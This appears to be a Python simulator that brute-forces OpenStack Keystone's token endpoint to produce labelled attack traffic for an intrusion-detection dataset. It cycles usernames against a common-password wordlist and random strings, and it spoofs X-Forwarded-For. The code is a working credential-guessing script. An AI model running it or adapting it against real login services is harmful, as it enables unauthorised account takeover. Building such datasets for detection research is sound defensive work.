#!/usr/bin/env python3
"""
2_attack_brute.py
=================
Simulates brute force authentication attacks against Keystone.

Attack pattern:
- Repeated POST requests to /v3/auth/tokens with incorrect credentials
- High failure rate (>90%)
- Elevated request rate from a single source IP
- Mixed mode: alternates between random passwords and wordlist passwords

Usage:
    python3 2_attack_brute.py --target 2000 --mode mixed
"""

import requests
import time
import random
import csv
import os
import argparse
from datetime import datetime
from config import KEYSTONE_URL, OUTPUT_DIR, LOG_FIELDS, ATTACK_TARGET, ADMIN_DOMAIN

os.makedirs(OUTPUT_DIR, exist_ok=True)

# Common password wordlist for mixed-mode brute force
WORDLIST = [
    "password", "123456", "admin", "secret", "letmein",
    "qwerty", "abc123", "password1", "welcome", "monkey",
    "dragon", "master", "sunshine", "princess", "shadow",
    "superman", "iloveyou", "trustno1", "Password1", "admin123",
]

TARGET_USERS = ["admin", "user1", "user2", "user3", "demo", "nova", "neutron"]


class RateTracker:
    def __init__(self):
        self.requests = []
        self.fails    = []
        self.times    = []

    def add(self, ts, success, resp_ms):
        cutoff = ts - 60
        self.requests = [t for t in self.requests if t > cutoff]
        self.fails    = [t for t in self.fails    if t > cutoff]
        self.times    = [(t, r) for t, r in self.times if t > cutoff]
        self.requests.append(ts)
        self.times.append((ts, resp_ms))
        if not success:
            self.fails.append(ts)

    def req_rate(self):  return len(self.requests)
    def fail_rate(self): return len(self.fails) / len(self.requests) if self.requests else 0.0
    def consecutive_fails(self): return len(self.fails)


def simulate_brute(target=ATTACK_TARGET, mode="mixed", output_file=None):
    if output_file is None:
        output_file = os.path.join(OUTPUT_DIR, "raw_brute_mixed.csv")

    print(f"Brute Force simulation [{mode} mode]")
    print(f"Target: {target} requests → {output_file}\n")

    source_ip    = f"10.0.{random.randint(10,20)}.{random.randint(1,5)}"
    tracker      = RateTracker()
    rows         = []
    total        = 0
    recent_times = []

    while total < target:
        # Choose target user and password
        username = random.choice(TARGET_USERS)
        if mode == "random":
            password = "".join(random.choices(
                "abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6, 12)))
        elif mode == "wordlist":
            password = random.choice(WORDLIST)
        else:  # mixed
            password = (random.choice(WORDLIST) if random.random() < 0.4
                        else "".join(random.choices(
                            "abcdefghijklmnopqrstuvwxyz0123456789",
                            k=random.randint(6, 12))))

        payload = {
            "auth": {
                "identity": {
                    "methods": ["password"],
                    "password": {
                        "user": {
                            "name": username,
                            "domain": {"name": ADMIN_DOMAIN},
                            "password": password,
                        }
                    },
                }
            }
        }
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": source_ip,
        }

        req_bytes = len(str(payload)) + len(str(headers))
        ts_start  = time.time()
        try:
            resp       = requests.post(
                f"{KEYSTONE_URL}/v3/auth/tokens",
                json=payload, headers=headers, timeout=5)
            resp_ms    = (time.time() - ts_start) * 1000
            status     = resp.status_code
            resp_bytes = len(resp.content)
        except Exception:
            resp_ms    = 1000
            status     = 0
            resp_bytes = 0

        success = 200 <= status < 400
        now     = time.time()
        tracker.add(now, success, resp_ms)
        recent_times.append(resp_ms)
        if len(recent_times) > 20:
            recent_times.pop(0)

        dt   = datetime.now()
        hour = dt.hour
        row  = {
            "timestamp":                dt.isoformat(),
            "hour_of_day":              hour,
            "minute_of_hour":           dt.minute,
            "day_of_week":              dt.weekday(),
            "is_business_hours":        1 if 9 <= hour <= 18 else 0,
            "http_method":              2,   # POST
            "endpoint_name":            "/v3/auth/tokens",
            "endpoint_category":        3,
            "path_depth":               3,
            "request_bytes":            req_bytes,
            "response_bytes":           resp_bytes,
            "status_code":              status,
            "status_class":             status // 100 if status > 0 else 0,
            "response_time_ms":         round(resp_ms, 2),
            "is_slow_request":          1 if resp_ms > 500 else 0,
            "is_auth_endpoint":         1,
            "is_admin_endpoint":        0,
            "user_id_hash":             0,
            "has_user_context":         1,
            "req_rate_per_ip_60s":      tracker.req_rate(),
            "fail_rate_per_ip_60s":     round(tracker.fail_rate(), 4),
            "user_req_count_60s":       tracker.req_rate(),
            "avg_response_time_recent": round(
                sum(recent_times) / len(recent_times), 2),
            "has_error_log":            1 if status >= 500 else 0,
            "is_burst":                 1 if tracker.req_rate() > 10 else 0,
            "is_repeated_fail":         1 if tracker.fail_rate() > 0.5 else 0,
            "source_ip":                source_ip,
            "label":                    1,
            "attack_type":              "brute",
        }
        rows.append(row)
        total += 1

        if total % 200 == 0:
            print(f"  [{total}/{target}] "
                  f"fail_rate={tracker.fail_rate():.2%} "
                  f"req_rate={tracker.req_rate()}/60s "
                  f"consecutive_fails={tracker.consecutive_fails()}")

        time.sleep(random.uniform(0.3, 1.5))

    with open(output_file, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=LOG_FIELDS)
        writer.writeheader()
        writer.writerows(rows)

    failed = sum(1 for r in rows if r["status_code"] not in range(200, 400))
    print(f"\n[DONE] {total} requests written → {output_file}")
    print(f"  Failed auth:   {failed} ({failed/total:.1%})")
    print(f"  Max req_rate:  {max(r['req_rate_per_ip_60s'] for r in rows)}/60s")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force attack simulator")
    parser.add_argument("--target", type=int, default=ATTACK_TARGET)
    parser.add_argument("--mode",   type=str, default="mixed",
                        choices=["random", "wordlist", "mixed"])
    parser.add_argument("--output", type=str, default=None)
    args = parser.parse_args()
    simulate_brute(target=args.target, mode=args.mode, output_file=args.output)
